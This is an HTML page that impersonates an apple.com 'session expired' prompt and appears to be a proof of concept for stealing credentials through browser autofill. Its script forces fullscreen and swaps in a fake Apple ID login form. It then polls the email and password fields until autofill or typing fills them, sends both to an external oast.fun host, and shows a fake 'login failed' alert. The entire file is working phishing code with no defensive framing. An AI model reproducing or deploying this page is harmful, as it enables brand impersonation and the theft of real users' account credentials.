<!DOCTYPE html>
<html>
<head>
  <title>Verification Required</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    html, body {
      margin: 0;
      font-family: -apple-system, sans-serif;
      background: white;
      overflow: hidden;
    }

    .center {
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    input {
      padding: 12px;
      font-size: 17px;
      width: 80%;
      margin: 8px 0;
      border-radius: 8px;
      border: 1px solid #ccc;
    }

    button {
      padding: 12px 24px;
      font-size: 16px;
      background: #007aff;
      color: white;
      border: none;
      border-radius: 8px;
      margin-top: 12px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="center">
    <h2>Session expired</h2>
    <p>You must re-login to continue apple.com.</p>
    <button onclick="exploit()">Continue</button>
  </div>

  <script>
    function exfil(email, pass) {
      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/autofill", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, pass })
      });
    }

    function monitorAutofill() {
      const emailField = document.getElementById('email');
      const passField = document.getElementById('pass');

      const interval = setInterval(() => {
        const email = emailField.value;
        const pass = passField.value;

        if (email.length > 3 && pass.length > 3) {
          clearInterval(interval);
          exfil(email, pass);
        }
      }, 300);
    }

    function exploit() {
      document.documentElement.requestFullscreen().then(() => {
        document.body.innerHTML = `
          <div class="center">
            <h2>üîí Apple ID Login Required</h2>
            <input id="email" type="email" autocomplete="on" placeholder="Email / Apple ID"><br>
            <input id="pass" type="password" autocomplete="on" placeholder="Password"><br>
            <button onclick="fakeLogin()">Login</button>
          </div>
        `;

        monitorAutofill(); // start watching autofill after UI replaces
      });
    }

    function fakeLogin() {
      alert("üîê Login failed. Please try again.");
    }
  </script>
</body>
</html>
